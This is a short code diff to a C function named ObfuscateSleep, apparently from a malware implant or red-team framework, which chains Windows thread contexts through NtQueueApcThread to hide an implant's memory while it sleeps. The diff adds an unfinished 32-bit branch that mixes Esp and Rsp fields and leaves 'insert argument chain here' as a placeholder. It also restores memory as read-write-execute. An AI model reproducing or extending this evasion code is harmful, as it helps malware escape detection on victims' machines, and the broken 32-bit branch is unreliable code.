@@ -214,6 +214,7 @@ D_SEC(B) NTSTATUS ObfuscateSleep( PINSTANCE Ins, PCONTEXT FakeFrame, PLARGE_INTE
 		goto END_ROP_CHAIN;
 	};
 
+#if defined( _WIN64 )
 	*ContextRopEnt = *ContextStolen;
 	ContextRopEnt->ContextFlags = CONTEXT_FULL;
 	ContextRopEnt->Rsp = U_PTR( ContextStolen->Rsp );
@@ -222,6 +223,15 @@ D_SEC(B) NTSTATUS ObfuscateSleep( PINSTANCE Ins, PCONTEXT FakeFrame, PLARGE_INTE
 	ContextRopEnt->Rdx = U_PTR( FALSE );
 	ContextRopEnt->R8  = U_PTR( NULL );
 	*( ULONG_PTR * )( ContextRopEnt->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;
+#else
+	*ContextRopEnt = *ContextStolen;
+	ContextRopEnt->ContextFlags = CONTEXT_FULL;
+	ContextRopEnt->Esp = U_PTR( ContextStolen->Esp - 0x100 );
+	ContextRopEnt->Eip = U_PTR( Ins->nt.NtWaitForSingleObject );
+	*( ULONG_PTR * )( ContextRopEnt->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;
+
+	// insert argument chain here
+#endif
 
 	ContextStatus = Ins->nt.NtQueueApcThread(
 				ContextRopThd,
@@ -461,7 +471,7 @@ D_SEC(B) NTSTATUS ObfuscateSleep( PINSTANCE Ins, PCONTEXT FakeFrame, PLARGE_INTE
 	ContextRopRes->Rcx = U_PTR( NtCurrentProcess() );
 	ContextRopRes->Rdx = U_PTR( &ContextResPtr );
 	ContextRopRes->R8  = U_PTR( &ContextResLen );
-	ContextRopRes->R9  = U_PTR( PAGE_EXECUTE_READ );
+	ContextRopRes->R9  = U_PTR( PAGE_EXECUTE_READWRITE );
 	*( ULONG_PTR *)( ContextRopRes->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert ;
 	*( ULONG_PTR *)( ContextRopRes->Rsp + 0x28 ) = ( ULONG_PTR ) &ContextResPrt;
 
